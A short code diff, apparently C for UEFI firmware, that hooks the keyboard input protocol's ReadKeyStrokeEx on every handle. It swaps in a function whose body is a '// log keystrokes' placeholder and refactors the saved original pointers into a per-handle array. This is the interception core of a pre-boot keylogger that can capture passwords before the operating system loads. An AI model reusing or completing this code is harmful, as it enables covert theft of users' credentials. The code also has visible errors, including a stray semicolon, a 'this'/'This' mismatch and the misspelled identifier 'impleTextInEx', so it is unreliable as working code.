@@ -1,12 +1,11 @@
 #include <Uefi.h>
 #include <Protocol/SimpleTextInEx.h>
 
-EFI_INPUT_READ_KEY_EX gOriginalReadKeyStrokeEx;
-
 EFI_STATUS EFIAPI ReadKeyStrokeExHook(IN EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL *This,
                                       OUT EFI_KEY_DATA *KeyData);
 {
-    gOriginalReadKeyStrokeEx(This, KeyData);
+    SimpleTextInputExHook *Hook = GetHookFromProtocol(this);
+    Hook->Original(This, KeyData);
 
     // log keystrokes
 }
@@ -15,6 +14,9 @@ VOID HookSimpleTextInEx()
 {
     gBS->LocateHandleBuffer(ByProtocol, &gEfiSimpleTextInputExProtocolGuid,
                             NULL, &HandleCount, Handles);
+
+    gHooks = AllocatePool(HandleCount * sizeof(SimpleTextInputExHook));
+
     for (UINTN i = 0; i < HandleCount; ++i)
     {
         EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL *SimpleTextInEx;
@@ -22,7 +24,9 @@ VOID HookSimpleTextInEx()
                                      &gEfiSimpleTextInputExProtocolGuid,
                                      (VOID **)&SimpleTextInEx);
 
-        gOriginalReadKeyStrokeEx = SimpleTextInEx->ReadKeyStrokeEx;
+        SimpleTextInputExHook *Hook = &gHooks[gHookCount++];
+        Hook->Protocol = SimpleTextInEx;
+        Hook->Original = impleTextInEx->ReadKeyStrokeEx;
 
         SimpleTextInEx->ReadKeyStrokeEx = ReadKeyStrokeExHook;
     }
